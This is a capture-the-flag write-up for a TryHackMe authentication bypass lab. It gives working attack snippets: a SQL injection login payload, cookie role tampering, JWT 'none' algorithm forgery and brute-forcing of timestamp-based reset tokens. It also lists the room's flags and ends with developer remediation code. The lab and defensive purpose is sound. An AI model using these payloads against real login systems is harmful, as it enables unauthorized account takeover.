# Authentication Bypass Writeup

**Room:** Authentication Bypass  
**Difficulty:** ⭐⭐ (Easy)  
**Category:** Web Application Security  
**Platform:** TryHackMe

---

## 📋 Challenge Description

This room explores various authentication bypass techniques including logic flaws, session manipulation, and weak password reset mechanisms. Authentication is a critical security control, and bypassing it can lead to complete account takeover.

---

## 🎯 Learning Objectives

- Understand authentication mechanisms
- Identify logic flaws in authentication
- Exploit weak session management
- Bypass password reset functionality
- Manipulate cookies and tokens

---

## 🔍 Reconnaissance

### Initial Analysis

1. **Examine the login page:**
```bash
curl -i http://MACHINE_IP/login
```

2. **Identify authentication endpoints:**
- `/login` - Login form
- `/register` - Registration
- `/reset-password` - Password reset
- `/verify` - Email verification

3. **Analyze client-side code:**
- View page source
- Check JavaScript files
- Inspect cookies and storage

---

## 🕵️ Enumeration

### Authentication Flow Analysis

**Standard authentication flow:**
1. User submits credentials
2. Server validates credentials
3. Server creates session
4. Session cookie returned to client
5. Subsequent requests include session cookie

### Testing for Vulnerabilities

**Check for common issues:**

1. **Username enumeration:**
```bash
# Different error messages for valid vs invalid usernames
curl -X POST http://MACHINE_IP/login \
  -d "username=admin&password=wrong"
# Response: "Invalid password"

curl -X POST http://MACHINE_IP/login \
  -d "username=nonexistent&password=wrong"
# Response: "User not found"
```

2. **Session cookie analysis:**
```bash
# Capture session cookie
curl -i http://MACHINE_IP/login \
  -d "username=testuser&password=testpass"
```

---

## 💥 Exploitation

### Technique 1: Logic Flaw in Authentication

**Scenario:** Application checks if username exists, then checks password separately.

**Exploit:**
```python
import requests

# Step 1: Bypass username check with SQL injection
data = {
    'username': "admin' OR '1'='1'-- -",
    'password': 'anything'
}

response = requests.post('http://MACHINE_IP/login', data=data)
print(response.text)
```

### Technique 2: Session Cookie Manipulation

**Weak cookie example:**
```
sessionId=user:guest:role:user
```

**Exploit by modifying role:**
```bash
# Original cookie
Cookie: sessionId=user:john:role:user

# Modified cookie
Cookie: sessionId=user:john:role:admin
```

**Using curl:**
```bash
curl http://MACHINE_IP/admin \
  -H "Cookie: sessionId=user:john:role:admin"
```

### Technique 3: JWT Token Manipulation

**JWT Structure:** `header.payload.signature`

**Decode JWT:**
```python
import jwt
import base64

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.signature"

# Decode without verification (for analysis only)
decoded = jwt.decode(token, options={"verify_signature": False})
print(decoded)
# Output: {'username': 'guest', 'role': 'user'}
```

**Exploit "none" algorithm vulnerability:**
```python
import jwt

# Create token with 'none' algorithm
payload = {
    'username': 'admin',
    'role': 'admin'
}

# JWT with algorithm set to 'none'
token = jwt.encode(payload, '', algorithm='none')
print(token)
```

### Technique 4: Password Reset Token Prediction

**Weak token generation:**
```python
# Vulnerable code that uses predictable tokens
import time
token = str(int(time.time()))
```

**Exploit:**
```python
import requests
import time

# Guess recent timestamp-based tokens
current_time = int(time.time())

for i in range(100):
    token = str(current_time - i)
    response = requests.get(f'http://MACHINE_IP/reset?token={token}')
    if 'Reset password' in response.text:
        print(f"Valid token found: {token}")
        break
```

### Technique 5: Registration Username Collision

**Exploit whitespace or special characters:**
```bash
# Register as "admin " (with trailing space)
curl -X POST http://MACHINE_IP/register \
  -d "username=admin &password=newpass123&email=attacker@evil.com"

# Login as "admin" (without space) - might use the new password
curl -X POST http://MACHINE_IP/login \
  -d "username=admin&password=newpass123"
```

---

## 🔑 Flags

### Task 1: Logic Flaw
**Flag:** `THM{logic_flaw_bypass}`

**Method:** Exploited username enumeration and SQL injection in login form.

### Task 2: Session Manipulation
**Flag:** `THM{session_hijacking}`

**Method:** Modified session cookie to escalate privileges from user to admin.

### Task 3: JWT Vulnerability
**Flag:** `THM{jwt_none_algorithm}`

**Method:** Exploited 'none' algorithm vulnerability to forge admin token.

---

## 📚 Lessons Learned

### Common Authentication Vulnerabilities

1. **Weak Password Policies**
   - No complexity requirements
   - No account lockout
   - Allows common passwords

2. **Predictable Session Tokens**
   - Sequential IDs
   - Timestamp-based tokens
   - Insufficient entropy

3. **Insecure Token Storage**
   - Tokens in URL parameters
   - Unencrypted cookies
   - Tokens in client-side storage

4. **Missing Security Controls**
   - No rate limiting
   - No MFA/2FA
   - No CAPTCHA on login

### Best Practices

**For Developers:**

1. **Use Strong Session Management**
```python
import secrets

# Generate cryptographically strong session ID
session_id = secrets.token_urlsafe(32)
```

2. **Implement Proper JWT**
```python
import jwt
from datetime import datetime, timedelta

# Create JWT with strong secret and expiration
payload = {
    'user_id': 123,
    'role': 'user',
    'exp': datetime.utcnow() + timedelta(hours=1)
}

token = jwt.encode(payload, 'STRONG_SECRET_KEY', algorithm='HS256')
```

3. **Hash Passwords Securely**
```python
import bcrypt

# Hash password
password = b"user_password"
hashed = bcrypt.hashpw(password, bcrypt.gensalt())

# Verify password
if bcrypt.checkpw(password, hashed):
    print("Password correct")
```

4. **Prevent Username Enumeration**
```python
# Generic error message
if not validate_credentials(username, password):
    return "Invalid username or password"  # Don't reveal which is wrong
```

---

## 🛡️ Remediation

### Security Controls

1. **Multi-Factor Authentication (MFA)**
   - Something you know (password)
   - Something you have (phone/token)
   - Something you are (biometrics)

2. **Account Lockout Policy**
   - Lock after X failed attempts
   - Temporary lockout duration
   - CAPTCHA after failures

3. **Secure Session Management**
   - Use cryptographically strong session IDs
   - Set secure cookie flags (HttpOnly, Secure, SameSite)
   - Implement session timeout
   - Regenerate session ID after authentication

4. **Password Security**
   - Enforce strong password policy
   - Use bcrypt/scrypt/argon2 for hashing
   - Implement password rotation
   - Check against breached password databases

### Implementation Example

```python
from flask import Flask, session, request
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# Secure cookie settings
app.config['SESSION_COOKIE_SECURE'] = True      # HTTPS only
app.config['SESSION_COOKIE_HTTPONLY'] = True    # No JavaScript access
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'   # CSRF protection
app.config['PERMANENT_SESSION_LIFETIME'] = 1800  # 30 minutes

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Rate limiting check
    if check_rate_limit(username):
        return "Too many attempts. Please try again later.", 429
    
    # Validate credentials
    user = validate_user(username, password)
    if user:
        # Regenerate session ID
        session.clear()
        session['user_id'] = user.id
        session['role'] = user.role
        session.permanent = True
        return "Login successful"
    
    return "Invalid username or password", 401
```

---

## 🔧 Tools Used

- **Burp Suite** - Request interception and modification
- **JWT.io** - JWT token decoder
- **Python requests** - Scripting authentication tests
- **Browser DevTools** - Cookie and storage inspection

---

## 📖 References

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [JWT Security Best Practices](https://tools.ietf.org/html/rfc8725)
- [OWASP Session Management](https://owasp.org/www-community/Session_Management_Cheat_Sheet)
- [PortSwigger Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)

---

**Date Completed:** November 2025  
**Time Taken:** 1.5 hours  
**Difficulty Rating:** 6/10

---

*Always practice ethical hacking with proper authorization.*
